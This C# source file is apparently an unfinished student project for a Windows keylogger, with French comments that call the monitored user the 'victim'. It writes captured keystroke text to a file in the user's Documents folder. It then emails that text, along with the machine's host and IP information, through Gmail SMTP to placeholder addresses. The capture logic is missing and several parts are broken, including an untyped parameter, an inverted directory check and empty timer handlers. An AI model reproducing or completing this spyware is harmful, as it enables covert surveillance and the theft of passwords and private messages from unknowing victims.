using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Xml.Serialization;
using System.Net;
using System.Net.Mail;

namespace ProjetEspionKeyLogger
{
    class KeyLogger
    {   
        //Texte saisie depuis le dernier clic ou, touche "entré", ou temps > 30 seconde
        private Enregistrement enregistrement_courrant;
        //Timer qui permet de gerer l'envoit des mails (toutes les 60 minutes)
        private Timer timer_mail;

        //Constructeur(peut etre pas nécessaire)
        public KeyLogger()
        {
            
            
            //Affiche la date du jour
            Console.WriteLine(enregistrement_courrant.dateTimeNow());
        }

        //Méthode permettant de démarrer le timer d'envoie des mails
        public void demarrerTimerMail()
        {
            timer_mail = new Timer()
            {
                //Toute les heures
                Interval = 60000000
            };

            //!!! PROVISOIR EN ATTENDANT DE COMPRENDRE !!!
            timer_mail.Tick += Timer_Tick;
        }

        //Boucle qui va toutes les X seconde, écrire dans un fichier txt
        private void demarrerTimerEnregistrement()
        {

        }

        //!!! PROVISOIR EN ATTENDANT DE COMPRENDRE !!!
        private void Timer_Tick(object sender, EventArgs e)
        {
            //Envoyer le mail
        }


        //Méthode qui écrit la saisie dans un .txt
        private void enregistreTxt(texte)
        {

            //chemin dynamique car on l'enregistre sur l'ordinateur de la victime
            string chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            //Si la victime n'a pas de dossier "mes documents" alors on en crée un
            if (Directory.Exists(chemin_Dossier))
            {
                Directory.CreateDirectory(chemin_Dossier);
            }

            //Création du fichier texte
            using (StreamWriter sw = File.CreateText(chemin_Dossier + @"\CaptureClavier.txt"))
            {

            }

            //Ecriture
            using (StreamWriter sw = File.AppendText(chemin_Dossier + @"\CaptureClavier.txt"))
            {
                sw.Write(texte);

            }
        }


        //Envoyer le txt pr mail ?
        private void envoieMail()
        {
            string Chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string Chemin_Txt = Chemin_Dossier + @"\CaptureClavier.txt";

            //recuperation du contenu du fichier
            string Contenu = File.ReadAllText(Chemin_Txt);

            //date du mail
            DateTime Date_Mail = DateTime.Now;
            //l'object du mail
            string Objet_Mail = "Capture keylogger";
            //recuperation de l'adresse ip de l'ordinateur pour identifier notre victime
            var Nom_Ordinateur = Dns.GetHostEntry(Dns.GetHostName());

            //faire si jamais l'ordi a plusieurs adresse ip ?

            //Création du corps du mail
            //Utiliser les autres fonctions de charlie 
            string Corps_Mail = "date :" + Date_Mail + "\n Adresse ip de la victime :" + Nom_Ordinateur + "\n";
            Corps_Mail += Contenu;

            //Envoie du mail avec le protocole SMTP (utilisation d'une adresse gmail dans ce cas mais on peut changer)
            //587=numero de port de gmail
            SmtpClient Client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage Message_Mail = new MailMessage();

            //definition de l'adresse source à mettre entre les guillemets
            Message_Mail.From = new MailAddress("xxx@gmail.com");

            //definition de l'adresse de destination 
            Message_Mail.To.Add("xxx@gmail.com");

            //defition de l'objet du mail
            Message_Mail.Subject = Objet_Mail;

            //En rapport avec l'authentification à l'adresse mail mais vérifier pq on met à false
            Client.UseDefaultCredentials = false;

            //utilisation du protocole SSL (Secure sockets Layer) pour transporter de manière sécurisée
            Client.EnableSsl = true;

            //remplacer les guillemets avec les vraies valeurs
            Client.Credentials = new System.Net.NetworkCredential("adresse", "le mot de passe de la'dresse");

            //définition du corps du mail
            Message_Mail.Body = Corps_Mail;

            //Envoie du message
            Client.Send(Message_Mail);

        }

        //sauvegarde dans un fichier XML
        public void saveToXml(string nomFichier)
        {
           /* FileStream file = File.Open(nomFichier, FileMode.Create);
            XmlSerializer serializer = new XmlSerializer(typeof(ListeEmployes));
            serializer.Serialize(file, this);
            file.Close();*/
        }


    }
}
